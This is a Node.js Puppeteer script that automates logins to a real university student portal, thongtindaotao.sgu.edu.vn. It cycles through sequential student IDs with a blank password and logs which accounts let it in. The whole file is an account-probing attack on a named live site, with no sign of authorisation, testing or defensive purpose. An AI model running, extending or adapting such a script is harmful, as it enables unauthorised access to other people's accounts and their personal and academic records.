const puppeteer = require("puppeteer");

async function main() {
    try {
        const browser = await puppeteer.launch({ headless: false });
        const page = await browser.newPage();

        for (let i = 25; i <= 27; i++) {
            await page.goto("http://thongtindaotao.sgu.edu.vn/default.aspx");
            await page.type(
                "#ctl00_ContentPlaceHolder1_ctl00_ucDangNhap_txtTaiKhoa",
                appendString("311741", i)
            );
            await page.type(
                "#ctl00_ContentPlaceHolder1_ctl00_ucDangNhap_txtMatKhau",
                ""
            );
            await page.click(
                "#ctl00_ContentPlaceHolder1_ctl00_ucDangNhap_btnDangNhap"
            );
            await page.waitForSelector("#ctl00_Header1_Logout1_lbtnLogOut");
            let element = await page.$("#ctl00_Header1_Logout1_lbtnLogOut");
            let value = await page.evaluate((el) => el.textContent, element);
            if (value === "Thoát") {
                console.log("[SUCCESSS]", appendString("311741", i));
            } else {
                console.log("[FAIL]", appendString("311741", i));
            }
        }
    } catch (error) {
        console.log(error);
    }
}

function appendString(prefix, number) {
    while ((prefix + number).length < 10) {
        number = "0" + number;
    }
    return prefix + number;
}

main();
